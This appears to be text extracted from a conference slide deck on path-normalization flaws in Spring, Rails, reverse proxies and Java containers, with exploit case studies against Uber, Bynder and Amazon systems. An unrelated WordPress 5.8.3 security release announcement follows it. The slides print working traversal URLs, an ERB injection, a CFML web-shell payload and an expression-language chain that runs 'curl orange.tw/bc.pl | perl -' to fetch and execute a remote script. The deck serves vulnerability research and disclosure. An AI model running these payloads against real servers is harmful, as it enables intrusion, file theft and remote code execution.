CVE-2018-1999002

CVE-2018-14371

Ruby on Rails

CVE-2018-3760

Sinatra

Next.js

CVE-2018-7212

CVE-2018-6184

resolve-path

CVE-2018-3732

Aiohttp

Lighttpd

None

Pending

Agenda

1. The blind side of path normalization

2.

In-depth review of existing implementations

• Discovered Spring Framework CVE-2018-1271

• Discovered Ruby on Rails CVE-2018-3760

3. New multi-layered architectures attack surface

Spring 0day - CVE-2018-1271

• Directory Traversal with Spring MVC on Windows

• Patches of CVE-2014-3625

1. isInvalidPath(path)

2. isInvalidPath(URLDecoder.decode(path, "UTF-8"))

3. isResourceUnderLocation(resource, location)

if (path.contains("WEB-INF") || path.contains("META-INF")) {

return true;

}
if (path.contains(":/")) {

1 protected boolean isInvalidPath(String path) {
2
3
4
5
6
7
8
9

}
if (path.contains("..")) {

return true;

path = cleanPath(path);
if (path.contains("../"))

10
11
12
13
14
15 }

return true;

}

return false;

Dangerous Pattern :(

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26

public static String cleanPath(String path) {

String pathToUse = replace(path, "\\", "/");

String[] pathArray = delimitedListToStringArray(pathToUse, "/");
List<String> pathElements = new LinkedList<>();
int tops = 0;

for (int i = pathArray.length - 1; i >= 0; i--) {

String element = pathArray[i];
if (".".equals(element)) {

} else if ("..".equals(element)) {

tops++;

} else {

if (tops > 0)

tops--;

else

pathElements.add(0, element);

}

}

for (int i = 0; i < tops; i++) {

pathElements.add(0, "..");

}
return collectionToDelimitedString(pathElements, "/");

}

public static String cleanPath(String path) {

String pathToUse = replace(path, "\\", "/");

String[] pathArray = delimitedListToStringArray(pathToUse, "/");
List<String> pathElements = new LinkedList<>();
int tops = 0;

for (int i = pathArray.length - 1; i >= 0; i--) {

String element = pathArray[i];
if (".".equals(element)) {

} else if ("..".equals(element)) {

tops++;

} else {

if (tops > 0)

tops--;

else

Allow empty element?

pathElements.add(0, element);

}

}

for (int i = 0; i < tops; i++) {

pathElements.add(0, "..");

}
return collectionToDelimitedString(pathElements, "/");

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26

}

Spring 0day - CVE-2018-1271

Input

/foo/../

/foo/../../

/foo//../

/foo///../../

/foo////../../../

cleanPath

Filesystem

/

/../

/foo/

/foo/

/foo/

/

/../

/

/../

/../../

Spring 0day - CVE-2018-1271

• How to exploit?

$ git clone git@github.com:spring-projects/spring-amqp-samples.git

$ cd spring-amqp-samples/stocks

$ mvn jetty:run

http://0:8080/spring-rabbit-stock/static/%255c%255c%255c%255c%255c
%255c..%255c..%255c..%255c..%255c..%255c..%255c /Windows/win.ini

Spring 0day - CVE-2018-1271

• How to exploit?

$ git clone git@github.com:spring-projects/spring-amqp-samples.git

$ cd spring-amqp-samples/stocks

$ mvn jetty:run

http://0:8080/spring-rabbit-stock/static/%255c%255c%255c%255c%255c
%255c..%255c..%255c..%255c..%255c..%255c..%255c/Windows/ win.ini

Do not use Windows

Mitigation from Spring

Bonus on Spark framework

• Code infectivity? Spark framework CVE-2018-9159

• A micro framework for web application in Kotlin and Java 8

commit 27018872d83fe425c89b417b09e7f7fd2d2a9c8c
Author: Per Wendel <per.i.wendel@gmail.com>
Date:   Sun May 18 12:04:11 2014 +0200

+   public static String cleanPath(String path) {
+       if (path == null) {
+       ...

Rails 0day - CVE-2018-3760

• Path traversal on @rails/sprockets

• Sprockets is the built-in asset pipeline system in Rails

• Affected Rails under development environment

• Or production mode with flag assets.compile on

Vulnerable enough!

$ rails new blog && cd blog

$ rails server

Listening on tcp://0.0.0.0:3000

Rails 0day - CVE-2018-3760

1.

Sprockets supports file:// scheme that bypassed absolute_path?

2. URL decode bypassed double slashes normalization

3. Method split_file_uri resolved URI and unescape again

• Lead to double encoding and bypass forbidden_request? and prefix check

http:/ /12 7.0.0.1:3000/assets/ file :%2f%2f/app/assets/images
/%252e%252e/%252e%252e/%252e%252e /etc / passwd

For the RCE lover

• This vulnerability is possible to RCE

• Inject query string %3F to File URL

/tmp/evil.erb

< % = `i d `%>

• Render as ERB template if the extension is .erb

ht tp: //12 7.0.0.1:3000/assets/file :%2f%2f/app/assets/images/%252e
%252e/%252e%252e/%252e%252e /tmp/evil.erb %3ftype=text/plain

• 貓

By Michael Saechang @Flickr

By Jonathan Leung @Flickr

By daisuke1230 @Flickr

Agenda

1. The blind side of path normalization

2.

In-depth review of existing implementations

3. New multi-layered architecture attack surface

• Remote Code Execution on Bynder

• Remote Code Execution on Amazon

P.S. Thanks Amazon and Bynder for the quick response time and open-minded vulnerability disclosure

URL path parameter

• d

http://example.com/foo;name=orange/bar/

• Some researchers already mentioned this might lead issues but it still

depends on programming fails

• How to make this feature more severely?

Reverse proxy architecture

 Resource sharing

 Load balance

 Cache

 Security

Client

static files
- images
- scripts
- files

Tomcat

Apache

When reverse proxy meets…

http://example.com/foo;name=orange/bar/

Apache

Nginx

IIS

Tomcat

Jetty

WildFly

WebLogic

Behavior

/foo;name=orange/bar/

/foo;name=orange/bar/

/foo;name=orange/bar/

/foo/bar/

/foo/bar/

/foo

/foo

BadProxy.org

Not really! Just a joke

How danger it could be?

• Bypass whitelist and blacklist ACL

• Escape from context mapping

• Web container console and management interface

• Other servlet contexts on the same server

Am I affected by this vuln?

• This is architecture's problem and vulnerable by default

if you are using reverse proxy with Java as backend service

• Apache mod_jk

• Apache mod_proxy

• Nginx ProxyPass

• …

/..;/ seems to be a directory.
Take it!

http://example.com/portal/..;/manager/html

OK! /..;/ is
the parent directory

/..;/ seems to be a directory,
Take it!

http://example.com/portal/..;/manager/html

OK! /..;/ is
the parent directory

Uber bounty case

• Uber disallow direct access *.uberinternal.com

• Redirect to OneLogin SSO by Nginx

• But we found a whitelist API(for monitor purpose?)

https://jira.uberinternal.com/status

/..;/ seems to be a directory
with the /status whitelist.a
Pass to you!

https://jira.uberinternal.com/status/..;/secure/Dashboard.jspa

Oh shit! /..;/ is
the parent directory

/..;/ seems like a directory,
match /status whitelist

https://jira.uberinternal.com/status/..;/secure/Dashboard.jspa

Oh shit! /..;/ is
parent directory

/..;/ seems like a directory,
match /status whitelist

https://jira.uberinternal.com/status/..;/secure/Dashboard.jspa

Oh shit! /..;/ is
parent directory

Bynder RCE case study

• Remote Code Execution on login.getbynder.com

• Out of bounty program scope in my original target

• But there is a bounty program in the service provider(Bynder)

• Abusing inconsistency between web architectures to RCE

Inconsistency to ACL bypass

HTTP/1.1 200 OK
Server: nginx
Date: Sat, 26 May 2018 06:23:35 GMT
Content-Type: text/html;charset=UTF-8
Set-Cookie: JSESSIONID=C4E5824F9EAE4296BCDE23C...

Inconsistency to ACL bypass

Inconsistency to ACL bypass

https://login.getbynder.com/..;/x

URL

/

/foo

/../

/..;/

/..;/x

Nginx action

Rewrite to http://tomcat/index.cfm/

Rewrite to http://tomcat/index.cfm/foo

400 Error(by Nginx)

Rewrite to http://tomcat/index.cfm/..;/

Rewrite to http://tomcat/index.cfm/..;/x

/..;/ seems to be a directory,
Take it

https://login.getbynder.com/..;/railo-context/admin/web.cfm

Oh shit! /..;/ is
the parent directory

Misconfiguration to auth bypass

Misconfiguration to auth bypass

• Automatic scaling up but seems to forget the password file

• About 16% chance to meet the misconfigured server(3~4 in 25)

• To make things worse, there is the CAPTCHA in login process

• We must be lucky to poke the same server on both CAPTCHA and

login process

Misconfiguration to auth bypass

Log injection to RCE

• How to pop a shell from Railo admin console?

• Railo supports customized template file and renders the file as CFML

• Changing the 404 template file to

/railo-context/../logs/exception.log

Log injection to RCE

Injecting malicious payload to exception.log

https://login.getbynder.com/..;/railo-context/<cfoutput>
<cfexecute name='/bin/bash' arguments='#Form.shell#'
timeout='10' variable='output'>
</cfexecute>#output#</cfoutput>.cfm

Log injection to RCE

$ curl https://login.getbynder.com/..;/railo-context/foo.cfm

-d 'SHELL=-c "curl orange.tw/bc.pl | perl -"'

Amazon RCE case study

• Remote Code Execution on Amazon Collaborate System

• Found the site collaborate-corp.amazon.com

• Running an open source project Nuxeo

• Chained several bugs and features to RCE

Path normalization bug leads to
ACL bypass

How does ACL fetch current request page?

protected static String getRequestedPage(HttpServletRequest httpRequest) {

String requestURI = httpRequest.getRequestURI();

String context = httpRequest.getContextPath() + '/';

String requestedPage = requestURI.substring(context.length());

int i = requestedPage.indexOf(';');

return i == -1 ? requestedPage : requestedPage.substring(0, i);

}

Path normalization bug leads to
ACL bypass

The path processing in ACL control is inconsistent with servlet

container so that we can bypass the whitelist

URL

/login;foo

/login;foo/bar;quz

/login;/..;/admin

ACL

/login

/login

/login

Container

/login

/login/bar

/login/../admin

Code reuse bug leads to
Expression Language injection

• Most pages return NullPointerException :(

• Nuxeo maps *.xhtml to Seam Framework

• We found Seam exposed numerous Hacker-Friendly features

by reading source code

Seam Feature

aaa

http://127.0.0.1/home.xhtml?actionMethod:/foo.xhtml:
utils.escape(...)

If there is a foo.xhtml under servlet context you can

execute the partial EL with certain format by actionMethod

foo.xhtml

"#{util.escape(...)}"

To make thing worse, Seam will evaluate again if the returned

string looks like an EL

http://127.0.0.1/home.xhtml?actionMethod:/foo.xhtml:
utils.escape(...)

foo.xhtml

"#{util.escape(...)}"

type(string)

return

#{malicious}

evaluate

To make thing worse, Seam will evaluate again if the returned

string looks like an EL

http://127.0.0.1/home.xhtml?actionMethod:/foo.xhtml:
utils.escape(...)

foo.xhtml

"#{util.escape(...)}"

Double
Evaluation

type(string)

return

#{malicious}

evaluate

Code reuse bug leads to
Expression Language injection

We can execute partial EL in any file under servlet context but

need to find a good gadget to control the return value

widgets/suggest_add_new_directory_entry_iframe.xhtml

<nxu:set var="directoryNameForPopup"

value="#{request.getParameter('directoryNameForPopup')}"
cache="true">

EL blacklist bypassed leads to
Remote Code Execution

Blacklist is always a bad idea :(

org/jboss/seam/blacklist.properties

ge tCl ass (
cl ass .
ad dRo le(
ge tPa ssword (
removeRole (

"".getClass().forName("java.lang.Runtime")

""["class"].forName("java.lang.Runtime")

Chain all together

1. Path normalization bug leads to ACL bypass

2. Bypass whitelist to access unauthorized Seam servlet

3. Use Seam feature actionMethod to invoke gadgets in a known file

4. Prepare second stage payload in directoryNameForPopup

5. Use array-like operators to bypass the EL blacklist

6. Write the shellcode with Java reflection API and wait for our shell back

https://host/nuxeo/login.jsp;/..;/create_file.xhtml

?actionMethod=

widgets/suggest_add_new_directory_entry_iframe.xhtml:
request.getParameter('directoryNameForPopup')

&directoryNameForPopup=

/?=#{

request.setAttribute(

'methods',
''['class'].forName('java.lang.Runtime').getDeclaredMethods()

)
---
request.getAttribute('methods')[15].invoke(

request.getAttribute('methods')[7].invoke(null),
'curl orange.tw/bc.pl | perl -'

)

}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml

?actionMethod=

widgets/suggest_add_new_directory_entry_iframe.xhtml:
request.getParameter('directoryNameForPopup')

&directoryNameForPopup=

/?=#{

request.setAttribute(

'methods',
''['class'].forName('java.lang.Runtime').getDeclaredMethods()

)
---
request.getAttribute('methods')[15].invoke(

request.getAttribute('methods')[7].invoke(null),
'curl orange.tw/bc.pl | perl -'

)

}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml

?actionMethod=

widgets/suggest_add_new_directory_entry_iframe.xhtml:
request.getParameter('directoryNameForPopup')

&directoryNameForPopup=

/?=#{

request.setAttribute(

'methods',
''['class'].forName('java.lang.Runtime').getDeclaredMethods()

)
---
request.getAttribute('methods')[15].invoke(

request.getAttribute('methods')[7].invoke(null),
'curl orange.tw/bc.pl | perl -'

)

}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml

?actionMethod=

widgets/suggest_add_new_directory_entry_iframe.xhtml:
request.getParameter('directoryNameForPopup')

&directoryNameForPopup=

/?=#{

request.setAttribute(

'methods',
''['class'].forName('java.lang.Runtime').getDeclaredMethods()

)
---
request.getAttribute('methods')[15].invoke(

request.getAttribute('methods')[7].invoke(null),
'curl orange.tw/bc.pl | perl -'

)

}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml

?actionMethod=

widgets/suggest_add_new_directory_entry_iframe.xhtml:
request.getParameter('directoryNameForPopup')

&directoryNameForPopup=

/?=#{

request.setAttribute(

'methods',
''['class'].forName('java.lang.Runtime').getDeclaredMethods()

)
---
request.getAttribute('methods')[15].invoke(

request.getAttribute('methods')[7].invoke(null),
'curl orange.tw/bc.pl | perl -'

)

}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml

?actionMethod=

widgets/suggest_add_new_directory_entry_iframe.xhtml:
request.getParameter('directoryNameForPopup')

&directoryNameForPopup=

/?=#{

request.setAttribute(

'methods',
''['class'].forName('java.lang.Runtime').getDeclaredMethods()

)
---
request.getAttribute('methods')[15].invoke(

request.getAttribute('methods')[7].invoke(null),
'curl orange.tw/bc.pl | perl -'

)

}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml

?actionMethod=

widgets/suggest_add_new_directory_entry_iframe.xhtml:
request.getParameter('directoryNameForPopup')

&directoryNameForPopup=

/?=#{

request.setAttribute(

'methods',
''['class'].forName('java.lang.Runtime').getDeclaredMethods()

)
---
request.getAttribute('methods')[15].invoke(

request.getAttribute('methods')[7].invoke(null),
'curl orange.tw/bc.pl | perl -'

)

}

https://host/nuxeo/login.jsp;/..;/create_file.xhtml

?actionMethod=

widgets/suggest_add_new_directory_entry_iframe.xhtml:
request.getParameter('directoryNameForPopup')

&directoryNameForPopup=

/?=#{

request.setAttribute(

'methods',
''['class'].forName('java.lang.Runtime').getDeclaredMethods()

)
---
request.getAttribute('methods')[15].invoke(

request.getAttribute('methods')[7].invoke(null),
'curl orange.tw/bc.pl | perl -'

)

}

Mitigation

• Isolate backend application

• Remove the management console and other servlet contexts

• Check behaviors between proxy and backend servers

• I wrote a path(just a PoC) to disable URL path parameter on both

Tomcat and Jetty

Summary

1.

Inconsistency and implicit propertiy on path parsers

2. New attack surface on multi-layered architectures

3. Case studies in new CVEs and bug bounty programs

Reference

• Java Servlets and URI Parameters

By @cdivilly

• 2 path traversal defects in Oracle's JSF2 implementation

By Synopsys Editorial Team

• Nginx configuration static analyzer

• By @yandex

Thanks!

orange_8361

orange@chroot.org



=== Content from wordpress.org_09116f2f_20250108_153641.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[News](https://wordpress.org/news)

WordPress 5.8.3 Security Release

All posts

Search results

* Categories
  + [All Posts](https://wordpress.org/news/all-posts/)
  + [Awards](https://wordpress.org/news/category/awards/)
  + [Community](https://wordpress.org/news/category/community/)
  + [Design](https://wordpress.org/news/category/design/)
  + [Development](https://wordpress.org/news/category/development/)
  + [Documentation](https://wordpress.org/news/category/documentation/)
  + [Events](https://wordpress.org/news/category/events/)
  + [Features](https://wordpress.org/news/category/features/)
  + [General](https://wordpress.org/news/category/general/)
  + [Interviews](https://wordpress.org/news/category/interviews/)
  + [Meta](https://wordpress.org/news/category/meta/)
  + [Month in WordPress](https://wordpress.org/news/category/month-in-wordpress/)
  + [Performance](https://wordpress.org/news/category/performance/)
  + [Podcast](https://wordpress.org/news/podcast/)
  + [Releases](https://wordpress.org/news/category/releases/)
  + [Security](https://wordpress.org/news/category/security/)
  + [Store](https://wordpress.org/news/category/store/)
  + [Testing](https://wordpress.org/news/category/testing/)
  + [Updates](https://wordpress.org/news/category/updates/)
  + [WordCamp](https://wordpress.org/news/category/wordcamp/)

* Categories
  + [All Posts](https://wordpress.org/news/all-posts/)
  + [Awards](https://wordpress.org/news/category/awards/)
  + [Community](https://wordpress.org/news/category/community/)
  + [Design](https://wordpress.org/news/category/design/)
  + [Development](https://wordpress.org/news/category/development/)
  + [Documentation](https://wordpress.org/news/category/documentation/)
  + [Events](https://wordpress.org/news/category/events/)
  + [Features](https://wordpress.org/news/category/features/)
  + [General](https://wordpress.org/news/category/general/)
  + [Interviews](https://wordpress.org/news/category/interviews/)
  + [Meta](https://wordpress.org/news/category/meta/)
  + [Month in WordPress](https://wordpress.org/news/category/month-in-wordpress/)
  + [Performance](https://wordpress.org/news/category/performance/)
  + [Podcast](https://wordpress.org/news/podcast/)
  + [Releases](https://wordpress.org/news/category/releases/)
  + [Security](https://wordpress.org/news/category/security/)
  + [Store](https://wordpress.org/news/category/store/)
  + [Testing](https://wordpress.org/news/category/testing/)
  + [Updates](https://wordpress.org/news/category/updates/)
  + [WordCamp](https://wordpress.org/news/category/wordcamp/)

January 6, 2022
By [Jonathan Desrosiers](https://profiles.wordpress.org/desrosj/)
in [Releases](https://wordpress.org/news/category/releases/), [Security](https://wordpress.org/news/category/security/)
# WordPress 5.8.3 Security Release

---

This security release features four security fixes. Because this is a security release, it is recommended that you update your sites immediately. All versions since WordPress 3.7 have also been updated.

WordPress 5.8.3 is a short-cycle security release. The next major release will be version [5.9](https://make.wordpress.org/core/5-9/), which is already in the Release Candidate stage.

You can update to WordPress 5.8.3 by downloading from WordPress.org or visiting your Dashboard → Updates and clicking Update Now.

If you have sites that support automatic background updates, they’ve already started the update process.

### Security Updates

Four security issues affect WordPress versions between 3.7 and 5.8. If you haven’t yet updated to 5.8, all WordPress versions since 3.7 have also been updated to fix the following security issue (except where noted otherwise):

* Props to Karim El Ouerghemmi and Simon Scannell of [SonarSource](https://www.sonarsource.com/) for disclosing an issue with stored XSS through post slugs.
* Props to Simon Scannell of [SonarSource](https://www.sonarsource.com/) for reporting an issue with Object injection in some multisite installations.
* Props to ngocnb and khuyenn from [GiaoHangTietKiem JSC](https://giaohangtietkiem.vn/) for working with [Trend Micro Zero Day Initiative](https://www.zerodayinitiative.com/) on reporting a SQL injection vulnerability in WP\_Query.
* Props to Ben Bidner from the WordPress security team for reporting a SQL injection vulnerability in WP\_Meta\_Query (only relevant to versions 4.1-5.8).

Thank you to all of the reporters above for [privately disclosing the vulnerabilities](https://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/). This gave the security team time to fix the vulnerabilities before WordPress sites could be attacked. Thank you to the members of the WordPress security team for implementing these fixes in WordPress.

For more information, check out the [5.8.3 HelpHub documentation page](https://wordpress.org/support/wordpress-version/version-5-8-3/).

### Thanks and props!

The 5.8.3 release was led by [@desrosj](https://profiles.wordpress.org/desrosj/) and [@circlecube](https://profiles.wordpress.org/circlecube/).

In addition to the security researchers and release squad members mentioned above, thank you to everyone who helped make WordPress 5.8.3 happen:

[Alex Concha](https://profiles.wordpress.org/xknown/), [Dion Hulse](https://profiles.wordpress.org/dd32/), [Dominik Schilling](https://profiles.wordpress.org/ocean90/), [ehtis](https://profiles.wordpress.org/ehtis/), [Evan Mullins](https://profiles.wordpress.org/circlecube/), [Jake Spurlock](https://profiles.wordpress.org/whyisjake/), [Jb Audras](https://profiles.wordpress.org/audrasjb/), [Jonathan Desrosiers](https://profiles.wordpress.org/desrosj/), [Ian Dunn](https://profiles.wordpress.org/iandunn/), [Peter Wilson](https://profiles.wordpress.org/peterwilsoncc/), [Sergey Biryukov](https://profiles.wordpress.org/sergeybiryukov/), [vortfu](https://profiles.wordpress.org/vortfu/), and [zieladam](https://profiles.wordpress.org/zieladam/).

Share this:

* [Threads](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/?share=threads&nb=1)
* [Mastodon](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/?share=mastodon&nb=1)
* [Bluesky](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/?share=bluesky&nb=1)
* [X](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/?share=x&nb=1)
* [Facebook](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/?share=facebook&nb=1)
* [LinkedIn](https://wordpress.org/news/2022/01/wordpress-5-8-3-security-release/?share=linkedin&nb=1)

---

[Previous The Month in WordPress – December 2021](https://wordpress.org/news/2022/01/the-month-in-wordpress-december-2021/)
[Next WordPress 5.9 RC 2](https://wordpress.org/news/2022/01/wordpress-5-9-rc-2/)

## Get the Latest Updates

### Subscribe to WordPress News

Email Address

Subscribe

Join 18.7K other subscribers

### WP Briefing — The WordPress Podcast

Learn about where WordPress is going and how you can get involved.

* [Apple Podcasts](https://podcasts.apple.com/us/podcast/wp-briefing/id1551691710)
* [Pocket Casts](https://pca.st/uqvvmt8t)
* [RSS](https://wordpress.org/news/feed/podcast)
* [Spotify](https://open.spotify.com/show/6BxgmE9Qg2TZA8EKZLJ4zS)
* [Stitcher](https://www.stitcher.com/show/wp-briefing)

[Listen to all episodes](https://wordpress.org/news/podcast/)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


